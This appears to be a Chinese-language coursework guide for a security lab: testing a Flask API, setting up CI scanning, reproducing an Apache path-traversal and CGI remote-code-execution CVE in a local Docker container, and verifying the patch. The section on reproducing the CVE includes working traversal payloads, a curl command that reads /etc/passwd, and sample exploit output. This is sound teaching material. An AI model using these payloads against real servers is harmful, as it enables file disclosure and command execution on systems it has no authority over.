# 实验 1 完成指南（按步骤）

这份指南把你需要亲手做的部分串成一条线。凡是标 **✅ 已完成** 的，仓库里已经有了；
标 **👉 你来做** 的，需要你在自己的机器 / 浏览器里点几下。

预计用时：本机部分 15 分钟，Docker + CVE 部分 30–40 分钟。

---

## 阶段 0 — 先确认仓库能跑

**✅ 已完成**：API 代码、72 个测试、CI 配置、CVE 环境与脚本、中英文 README 与报告。

**👉 你来做**：

```powershell
cd "C:\Users\ryz20\OneDrive\文档\deepseek-harness\default-workspace\lab1-secure-api"

# 1. 装依赖（若已装过 flask/pytest 可跳过）
pip install -r requirements-dev.txt

# 2. 跑测试，应该是 72 passed
python -m pytest -q

# 3. 起服务
python run.py
```

另开一个终端：

```powershell
.\scripts\demo.ps1
```

预期看到 9 个步骤全部 `[PASS]`，最后一行 `All steps finished.`。
**截图** → 存成 `docs\screenshots\api-demo.png`（可选，但报告里好加分）。

---

## 阶段 1 — 建 GitHub 仓库并 push

**👉 你来做**：

1. 在 GitHub 上新建一个 **public** 仓库，名字建议 `lab1-secure-api`，
   **不要**勾选 "Add a README / .gitignore / license"（本地已经有了）。

2. 在本项目目录里：

```powershell
git remote add origin https://github.com/<你的用户名>/lab1-secure-api.git
git branch -M main
git push -u origin main
```

3. 如果提示要凭据：用 **Personal Access Token** 当密码
   （GitHub → Settings → Developer settings → Personal access tokens → Fine-grained，
   勾 `Contents: Read and write`）。不要使用账号密码。

4. 把下面三处 `<OWNER>/<REPO>` 替换成你的实际地址：

   - `README.md` / `README.zh-CN.md` 顶部的 badge 和链接
   - `docs/report_en.md` / `docs/report_zh.md` 首页的仓库地址与流水线地址

```powershell
git add -A
git commit -m "docs: point links at the real repository"
git push
```

---

## 阶段 2 — 看 CI 跑起来，截图

push 之后去 `https://github.com/<你>/lab1-secure-api/actions`：

| 要截的图 | 怎么截 | 存成 |
|---|---|---|
| 三个 job 全绿 | Actions → CI → 最近一次运行，截 job 列表 | `docs/screenshots/ci-green.png` |
| Bandit 报告 | 点进 **SAST - Bandit** → 页面底部 **Summary** 里有报告文本 | `docs/screenshots/bandit.png` |
| pip-audit 报告 | 点进 **SCA - pip-audit** → **Summary**（应显示 `No known vulnerabilities found`） | `docs/screenshots/pip-audit.png` |

> 如果 Bandit 报出问题：点开看 `Issue: [B1xx] ...` 的说明，按提示改代码后重新 push。
> 如果 pip-audit 报依赖漏洞：升级 `requirements.txt` 里对应的版本后重新 push。
>
> 把最后成功的这次运行的 URL 填进报告首页的 *Pipeline* 一行。

---

## 阶段 3 — 装 Docker Desktop（只做一次）

**👉 你来做**（需要管理员权限 + 一次重启）：

1. 下载：<https://www.docker.com/products/docker-desktop/> → **Download for Windows**。
2. 双击安装，勾选 **Use WSL 2 instead of Hyper-V**（推荐）。
3. 如果提示 WSL 未安装，在**管理员** PowerShell 里执行：

```powershell
wsl --install
```

   然后**重启**。

4. 重启后打开 Docker Desktop，等左下角变成 **Engine running**。
5. 验证（普通 PowerShell 窗口）：

```powershell
docker --version
docker compose version
docker run --rm hello-world
```

   看到 `Hello from Docker!` 就成了。

> 装不上（比如公司机器禁虚拟化）就看备选方案：浏览器打开
> <https://labs.play-with-docker.com>，新建一个实例，在那里执行阶段 4 的命令，
> 只是仓库要 `git clone` 到实例里。

---

## 阶段 4 — 启动漏洞环境并复现 CVE

**✅ 已完成**：`cve/Dockerfile`、`cve/docker-compose.yml`、利用脚本、验证脚本。

**👉 你来做**：

```powershell
cd .\cve
docker compose up -d --build          # 第一次会拉 55 MB 左右的镜像
docker compose ps                     # 状态应为 Up
curl.exe -s http://127.0.0.1:8080/    # 应返回 It works!
```

复现攻击：

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1
```

预期看到：

```
2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
HTTP 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
>>> VULNERABLE: /etc/passwd was disclosed.

3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
uid=1(daemon) gid=1(daemon) groups=1(daemon)
>>> VULNERABLE: command execution confirmed.
```

**截图** → `docs/screenshots/cve-exploit.png`
（要包含命令行 + `root:x:0:0` + `uid=` 三样，缺一不可）

> 没有 `curl.exe`？Windows 10 1803+ 自带；或把脚本里的 `$curl = "curl.exe"` 改成绝对路径。

---

## 阶段 5 — 打补丁并验证

```powershell
docker compose down
docker compose -f docker-compose.fixed.yml up -d --build
powershell -ExecutionPolicy Bypass -File .\verify-fix.ps1
```

预期全部 `[PASS]`，最后一行：

```
RESULT: fix verified -- all checks passed.
```

**截图** → `docs/screenshots/cve-fixed.png`
（要包含 `HTTP 404` 和 `RESULT: fix verified`）

顺手对比一下两条命令：

```powershell
# 漏洞版（先 up 漏洞版才能对比）
curl.exe -sS --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

整理完容器：

```powershell
docker compose -f docker-compose.fixed.yml down
```

---

## 阶段 6 — 补报告首页与截图清单

**👉 你来做**：

1. 打开 `docs/report_zh.md` 与 `docs/report_en.md`，把首页的
   `<填写你的变体号>`、`<姓 名>`、`<填写学号>`、`<OWNER>/<REPO>` 换成真实信息。
2. 把 5 张截图放进 `docs/screenshots/`，文件名照 `docs/screenshots/README.md`。
3. 把 `docs/report_zh.md` 第 4.2 / 4.5 节里标了 ⬜ 的地方，换成你自己的实际输出
   （如果你跑出来的和预期不同，以你的实际输出为准——报告写的是你做过的事）。
4. 报告要求 PDF。不用装 pandoc / Word，仓库里带了一个转换脚本：

```powershell
python scripts\build_report.py
```

   会生成 `docs/report_zh.html` 和 `docs/report_en.html`（A4 排版、表格/代码块都有样式）。
   用 Edge/Chrome 打开 → `Ctrl+P` → 目标选 **"另存为 PDF"** → 纸张 A4、
   边距"默认"、勾选 **"背景图形"** → 保存。

   > 截图还没放进去时，PDF 里会显示一个红色虚线框并写明缺哪个文件——
   > 这是故意的，提醒你别交一份没图的报告。图片放进 `docs/screenshots/` 后
   > 重新跑一次脚本即可自动嵌入。

---

## 阶段 7 — 提交

| # | 提交物 | 在哪 |
|---|---|---|
| 1 | 公开仓库链接 | `https://github.com/<你>/lab1-secure-api` |
| 2 | README.md 内容 | 仓库根目录（含截图） |
| 3 | 最近一次成功流水线链接 | `https://github.com/<你>/lab1-secure-api/actions` |
| 4 | 修复文件目录 | `cve/Dockerfile.fixed` + `cve/docker-compose.fixed.yml`（也可以打包 `cve/` 整个目录） |
| 5 | 实验报告 | `docs/report_zh.pdf` / `docs/report_en.pdf` |

---

## 自查：得分点对照

- [ ] 2 分 — 三个接口都能通（`demo.ps1` 9 项 PASS）
- [ ] 0.5 分 — SQLi 防护有代码 + 有用例（`tests/test_sqli_xss.py`）
- [ ] 0.5 分 — XSS 防护有代码 + 有用例
- [ ] 1 分 — JWT + bcrypt 都能演示（401 无令牌 / 200 有令牌 / 伪造令牌被拒）
- [ ] 2 分 — CI 有 Bandit + pip-audit，且截图能看到报告
- [ ] 2 分 — `root:x:0:0` 截图（CVE 复现成功）
- [ ] 1 分 — 报告 4.3 节根因分析（解码/判断顺序、配置放大、2.4.50 为何不够）
- [ ] 1 分 — 修复后 404 + 回归通过截图

## 常见问题

**Q：`docker compose up` 卡在 pull？**
配镜像加速（Docker Desktop → Settings → Docker Engine 加 `registry-mirrors`），或换网络重试。

**Q：端口 8080 被占用？**
改 `cve/docker-compose.yml` 里的 `"8080:80"` 为 `"8081:80"`，脚本加 `-Target http://127.0.0.1:8081`。

**Q：`exploit.ps1` 报 403 而不是 200？**
说明 `<Directory /> Require all granted` 没生效（镜像没重新 build）。`docker compose up -d --build --force-recreate`。

**Q：CI 的 Bandit 报 B105（hardcode password）？**
大概率是 `app/db.py` 里的种子口令。那不是秘密，但更干净的做法是把演示口令改成
从环境变量读取；或者在该行加 `# nosec B105` 并写清理由（评分看的是你有没有解释）。
